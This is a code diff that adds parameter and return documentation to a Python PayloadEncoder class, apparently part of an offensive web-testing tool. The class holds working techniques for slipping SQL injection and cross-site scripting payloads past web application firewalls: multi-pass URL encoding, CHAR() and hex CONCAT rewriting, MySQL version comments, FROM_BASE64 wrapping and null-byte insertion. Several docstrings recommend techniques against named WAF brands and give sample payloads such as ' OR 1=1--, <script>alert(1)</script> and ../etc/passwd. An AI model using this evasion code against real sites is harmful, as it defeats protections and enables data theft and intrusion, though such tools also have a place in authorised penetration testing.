@@ -99,7 +99,16 @@ class PayloadEncoder:
     # ---- Public API ----------------------------------------------------------
 
     def encode(self, payload: str, technique: str) -> str:
-        """Apply a single named encoding technique. Returns original on unknown/error."""
+        """Apply a single named encoding technique. Returns original on unknown/error.
+
+        Args:
+            payload (str): The payload string to encode.
+            technique (str): One of `_TECHNIQUES`' keys.
+
+        Returns:
+            str: The encoded payload, or `payload` unchanged if
+            `technique` is unknown or encoding raises.
+        """
         if not payload:
             return payload
 
@@ -141,7 +150,16 @@ class PayloadEncoder:
         return dict(_TECHNIQUES)
 
     def get_waf_tips(self, waf_name: str) -> list[str]:
-        """Return recommended technique names for a specific WAF brand."""
+        """Return recommended technique names for a specific WAF brand.
+
+        Args:
+            waf_name (str): A WAF brand name or substring thereof
+                (case-insensitive), matched against `_WAF_TIPS`' keys.
+
+        Returns:
+            list[str]: The matched brand's recommended technique names,
+            or `_WAF_TIPS["generic"]`'s if no brand matched.
+        """
         key = waf_name.lower().strip()
         for brand in self._WAF_TIPS:
             if brand in key or key in brand:
@@ -149,7 +167,18 @@ class PayloadEncoder:
         return list(self._WAF_TIPS["generic"])
 
     def apply_random_evasion(self, payload: str, count: int = 1) -> str:
-        """Apply 'count' randomly chosen techniques in sequence."""
+        """Apply 'count' randomly chosen techniques in sequence.
+
+        Args:
+            payload (str): The payload string to encode.
+            count (int): Number of distinct techniques to chain, clamped
+                to the number of available techniques.
+
+        Returns:
+            str: `payload` unchanged if empty or `count < 1`, else the
+            result of applying `count` randomly chosen techniques in
+            sequence.
+        """
         if not payload or count < 1:
             return payload
         techniques = self.get_available_techniques()
@@ -168,13 +197,27 @@ class PayloadEncoder:
 
     def _double_url_encode(self, payload: str) -> str:
         """Double URL-encode. Effective against Cloudflare WAFs that decode once before matching.
-        Example: '<' -> '%3C' -> '%253C'"""
+        Example: '<' -> '%3C' -> '%253C'
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: The double-URL-encoded payload.
+        """
         single = urllib.parse.quote(payload, safe="")
         return urllib.parse.quote(single, safe="")
 
     def _triple_url_encode(self, payload: str) -> str:
         """Triple URL-encode. Targets WAFs performing multiple decode passes.
-        Example: '<' -> '%3C' -> '%253C' -> '%25253C'"""
+        Example: '<' -> '%3C' -> '%253C' -> '%25253C'
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: The triple-URL-encoded payload.
+        """
         result = urllib.parse.quote(payload, safe="")
         result = urllib.parse.quote(result, safe="")
         result = urllib.parse.quote(result, safe="")
@@ -184,7 +227,14 @@ class PayloadEncoder:
 
     def _hex_encode(self, payload: str) -> str:
         """Encode as SQL hex string literal (0x...). MySQL/MSSQL accept this as a string.
-        Example: 'admin' -> 0x61646d696e"""
+        Example: 'admin' -> 0x61646d696e
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: `0x` followed by the payload's UTF-8 bytes as hex.
+        """
         hex_str = payload.encode("utf-8").hex()
         return f"0x{hex_str}"
 
@@ -192,21 +242,43 @@ class PayloadEncoder:
         """Replace every character with CHAR(ascii_val) calls.
         Highly effective against quote-based blacklists and string keyword rules.
         Works in MySQL, MSSQL, Oracle.
-        Example: 'OR' -> CHAR(79,82)"""
+        Example: 'OR' -> CHAR(79,82)
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: `CHAR(<comma-separated ordinals>)`.
+        """
         char_vals = ",".join(str(ord(c)) for c in payload)
         return f"CHAR({char_vals})"
 
     def _concat_bypass(self, payload: str) -> str:
         """Wrap payload in CONCAT() using per-char hex fragments.
         Breaks exact-string WAF matching by splitting into individual hex chars.
-        Example: 'admin' -> CONCAT(0x61,0x64,0x6d,0x69,0x6e)"""
+        Example: 'admin' -> CONCAT(0x61,0x64,0x6d,0x69,0x6e)
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: `CONCAT(<comma-separated per-char hex literals>)`.
+        """
         frags = ",".join(f"0x{ord(c):02x}" for c in payload)
         return f"CONCAT({frags})"
 
     def _mysql_version_comment(self, payload: str) -> str:
         """Wrap SQL keywords in MySQL version-conditional inline comments /*!50000 */.
         MySQL executes; most WAFs (Cloudflare, ModSecurity) treat as comments and skip.
-        Example: 'UNION SELECT' -> '/*!50000 UNION*//*!50000 SELECT*/'"""
+        Example: 'UNION SELECT' -> '/*!50000 UNION*//*!50000 SELECT*/'
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: `payload` with each recognized SQL keyword wrapped in a
+            `/*!50000 KEYWORD*/` version-conditional comment.
+        """
         keywords = [
             "UNION", "SELECT", "FROM", "WHERE", "AND", "OR",
             "INSERT", "UPDATE", "DELETE", "DROP", "TABLE", "DATABASE",
@@ -227,7 +299,15 @@ class PayloadEncoder:
     def _sql_comment_obfuscation(self, payload: str) -> str:
         """Split SQL keywords mid-word with /**/ inline comments.
         Less aggressive than mysql_version_comment but works across all DBs.
-        Example: 'UNION SELECT' -> 'UN/**/ION SE/**/LECT'"""
+        Example: 'UNION SELECT' -> 'UN/**/ION SE/**/LECT'
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: `payload` with each recognized SQL keyword split mid-word
+            by a `/**/` comment.
+        """
         keywords = [
             "UNION", "SELECT", "FROM", "WHERE", "AND", "OR",
             "INSERT", "UPDATE", "DELETE", "DROP", "TABLE", "DATABASE",
@@ -286,7 +366,15 @@ class PayloadEncoder:
     def _unicode_encode(self, payload: str) -> str:
         """Encode special/non-ASCII chars as JS \\uXXXX escapes.
         Useful for XSS in JavaScript string contexts.
-        Example: '<script>' -> '\\u003cscript\\u003e'"""
+        Example: '<script>' -> '\\u003cscript\\u003e'
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: `payload` with non-ASCII/special chars replaced by
+            `\\uXXXX` escapes; everything else unchanged.
+        """
         result = ""
         for ch in payload:
             if ord(ch) > 127 or ch in '<>"\'&`\\':
@@ -299,7 +387,15 @@ class PayloadEncoder:
         """Encode HTML special chars as hex HTML entities (&#xNN;).
         Browsers decode entities before HTML parsing; WAFs matching raw chars miss this.
         Effective for XSS on Akamai rule sets.
-        Example: '<script>alert(1)</script>' -> '&#x3c;script&#x3e;alert&#x28;1&#x29;...'"""
+        Example: '<script>alert(1)</script>' -> '&#x3c;script&#x3e;alert&#x28;1&#x29;...'
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: `payload` with HTML-special characters replaced by
+            `&#xNN;` hex entities; everything else unchanged.
+        """
         _HTML_CHARS = set('<>"\'/&`=();{}[]')
         result = ""
         for ch in payload:
@@ -316,7 +412,15 @@ class PayloadEncoder:
         WAFs/parsers that truncate at null bytes miss the remainder of the payload.
         Inserted before the last '.' if present, otherwise appended.
         Example: '../etc/passwd.php' -> '../etc/passwd%00.php'
-        Example: \"' OR 1=1--\" -> \"' OR 1=1--%00\""""
+        Example: \"' OR 1=1--\" -> \"' OR 1=1--%00\"
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: `payload` with `%00` inserted before the last `.` if
+            present, else appended at the end.
+        """
         dot_idx = payload.rfind(".")
         if dot_idx != -1:
             return payload[:dot_idx] + "%00" + payload[dot_idx:]
@@ -326,6 +430,13 @@ class PayloadEncoder:
         """Wrap payload in MySQL FROM_BASE64() function call.
         MySQL evaluates this at query time; WAFs that don't decode base64 miss the injection.
         Best for string-value contexts (username/password fields).
-        Example: 'admin' -> FROM_BASE64('YWRtaW4=')"""
+        Example: 'admin' -> FROM_BASE64('YWRtaW4=')
+
+        Args:
+            payload (str): The payload string to encode.
+
+        Returns:
+            str: `FROM_BASE64('<base64 of payload>')`.
+        """
         b64 = base64.b64encode(payload.encode("utf-8")).decode("ascii")
         return f"FROM_BASE64('{b64}')"
